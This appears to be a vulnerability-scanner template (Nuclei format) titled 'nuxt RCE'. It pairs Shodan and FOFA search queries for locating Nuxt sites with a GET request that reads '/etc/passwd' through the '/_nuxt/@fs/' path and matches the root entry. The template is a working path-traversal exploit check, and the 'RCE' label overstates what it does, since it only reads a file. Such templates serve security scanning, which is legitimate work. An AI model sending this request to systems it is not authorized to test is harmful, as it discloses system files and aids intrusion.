id: nuxt-RCE
#Shodanï¼š/_nuxt/
#fofa:body="href=\"/_nuxt/"
#fofa:body="buildAssetsDir" && body="__nuxt"
info:
  name:  nuxt RCE
  author: momika233
  severity: high
  description: nuxt RCE
  reference:
    - https://www.github.com/momika233
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  tags: nuxt,RCE

requests:
  - method: GET
    path:
      - "{{BaseURL}}/_nuxt/@fs/etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200